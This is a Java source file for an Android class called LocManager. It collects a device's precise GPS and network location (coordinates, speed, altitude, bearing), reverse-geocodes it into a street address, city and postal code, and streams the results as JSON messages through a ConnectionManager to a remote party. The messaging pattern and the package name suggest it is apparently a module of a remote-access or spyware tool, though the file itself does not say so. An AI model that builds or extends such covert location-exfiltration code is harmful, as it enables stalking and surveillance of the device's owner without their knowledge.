package com.Deviant.pro;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Log;

import androidx.core.content.ContextCompat;

import org.json.JSONObject;

import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class LocManager {

    private static final String TAG = "LocManager";

    /** How long to wait for a fresh fix before giving up. */
    private static final long TIMEOUT_MS = 30_000L;

    /** Executor for geocoding — keeps it off the location callback thread. */
    private static final ExecutorService geocodeExecutor =
            Executors.newSingleThreadExecutor(r -> {
                Thread t = new Thread(r, "loc-geocode");
                t.setDaemon(true);
                return t;
            });

    // -------------------------------------------------------------------------
    // Public API
    // -------------------------------------------------------------------------

    public static void getLocation(final Context context) {

        // ✅ Check permissions before doing anything
        if (!hasLocationPermission(context)) {
            Log.w(TAG, "Location permission not granted — aborting");
            sendError("permission_denied");
            return;
        }

        LocationManager lm =
                (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        if (lm == null) {
            Log.e(TAG, "LocationManager unavailable");
            sendError("location_manager_null");
            return;
        }

        // 1. Send last-known immediately (fast, no wait)
        sendLastKnown(context, lm);

        // 2. Request a fresh fix on a dedicated HandlerThread
        //    ✅ HandlerThread has its own Looper — safe for LocationListener callbacks
        requestFreshLocation(context, lm);
    }

    // -------------------------------------------------------------------------
    // Last-known location
    // -------------------------------------------------------------------------

    private static void sendLastKnown(Context context, LocationManager lm) {
        try {
            Location gps = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            Location net = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            Location best;
            if (gps != null && net != null) {
                best = (gps.getAccuracy() <= net.getAccuracy()) ? gps : net;
            } else {
                best = (gps != null) ? gps : net;
            }

            if (best != null) {
                sendLocation(context, best, "last_known");
            } else {
                Log.d(TAG, "No last-known location available");
            }

        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied reading last-known location: "
                    + e.getMessage(), e);
        }
    }

    // -------------------------------------------------------------------------
    // Fresh location via HandlerThread
    // -------------------------------------------------------------------------

    private static void requestFreshLocation(Context context, LocationManager lm) {

        // ✅ HandlerThread owns its Looper — no manual Looper.prepare() needed
        HandlerThread handlerThread = new HandlerThread("loc-fresh");
        handlerThread.setDaemon(true);
        handlerThread.start();

        Handler handler = new Handler(handlerThread.getLooper());

        LocationListener listener = new LocationListener() {
            private volatile boolean handled = false;

            @Override
            public void onLocationChanged(Location location) {
                // Guard: only handle the first fix (both GPS and NETWORK may fire)
                if (!handled) {
                    handled = true;
                    removeAllUpdates(lm, this);
                    handlerThread.quitSafely(); // ✅ quitSafely instead of Looper.quit() mid-callback
                    sendLocation(context, location, "fresh");
                }
            }

            @Override public void onStatusChanged(String p, int s, Bundle e) {}
            @Override public void onProviderEnabled(String provider) {}
            @Override public void onProviderDisabled(String provider) {
                Log.d(TAG, "Provider disabled: " + provider);
            }
        };

        // ✅ Timeout posted to HandlerThread's own looper — no cross-thread Handler issues
        handler.postDelayed(() -> {
            Log.d(TAG, "Location timeout — no fresh fix received");
            removeAllUpdates(lm, listener);
            handlerThread.quitSafely();
        }, TIMEOUT_MS);

        // Register with both providers for best coverage
        boolean registered = false;
        try {
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                lm.requestLocationUpdates(
                        LocationManager.GPS_PROVIDER, 0, 0, listener, handlerThread.getLooper());
                registered = true;
                Log.d(TAG, "Registered GPS updates");
            }
            if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                lm.requestLocationUpdates(
                        LocationManager.NETWORK_PROVIDER, 0, 0, listener, handlerThread.getLooper());
                registered = true;
                Log.d(TAG, "Registered NETWORK updates");
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied requesting location updates: "
                    + e.getMessage(), e);
            handlerThread.quitSafely();
            return;
        }

        if (!registered) {
            Log.w(TAG, "No location provider enabled");
            sendError("no_provider_enabled");
            handlerThread.quitSafely();
        }
    }

    /** Remove updates from both providers safely. */
    private static void removeAllUpdates(LocationManager lm, LocationListener listener) {
        try {
            lm.removeUpdates(listener);
        } catch (Exception e) {
            Log.e(TAG, "removeUpdates error: " + e.getMessage(), e);
        }
    }

    // -------------------------------------------------------------------------
    // Send helpers
    // -------------------------------------------------------------------------

    private static void sendLocation(Context context, Location location, String status) {
        try {
            JSONObject res = new JSONObject();
            res.put("type",     "location");
            res.put("status",   status);
            res.put("lat",      location.getLatitude());
            res.put("lng",      location.getLongitude());
            res.put("accuracy", location.getAccuracy());
            res.put("speed",    location.getSpeed());
            res.put("altitude", location.getAltitude());
            res.put("bearing",  location.getBearing());
            res.put("provider", location.getProvider());
            res.put("time",     location.getTime());

            // ✅ Geocoding offloaded to separate executor — never blocks location thread
            final double lat = location.getLatitude();
            final double lng = location.getLongitude();
            geocodeExecutor.submit(() -> {
                try {
                    Geocoder geocoder = new Geocoder(context, Locale.getDefault());
                    List<Address> addresses =
                            geocoder.getFromLocation(lat, lng, 1);
                    if (addresses != null && !addresses.isEmpty()) {
                        Address addr = addresses.get(0);

                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i <= addr.getMaxAddressLineIndex(); i++) {
                            if (i > 0) sb.append(", ");
                            sb.append(addr.getAddressLine(i));
                        }

                        // Send enriched location as a follow-up message
                        JSONObject enriched = new JSONObject(res.toString());
                        enriched.put("address", sb.toString());
                        enriched.put("country", addr.getCountryName());
                        enriched.put("city",    addr.getLocality());
                        enriched.put("postal",  addr.getPostalCode());
                        enriched.put("geocoded", true);
                        ConnectionManager.send(enriched.toString());
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Geocoding failed: " + e.getMessage());
                    // Send without address if geocoding fails
                    ConnectionManager.send(res.toString());
                }
            });

            // Send immediately without waiting for geocoding
            ConnectionManager.send(res.toString());

        } catch (Exception e) {
            Log.e(TAG, "sendLocation error: " + e.getMessage(), e);
        }
    }

    private static void sendError(String reason) {
        try {
            JSONObject err = new JSONObject();
            err.put("type",  "location");
            err.put("error", reason);
            ConnectionManager.send(err.toString());
        } catch (Exception ignored) {}
    }

    // -------------------------------------------------------------------------
    // Permission helper
    // -------------------------------------------------------------------------

    private static boolean hasLocationPermission(Context context) {
        return ContextCompat.checkSelfPermission(context,
                Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(context,
                Manifest.permission.ACCESS_COARSE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
    }
}
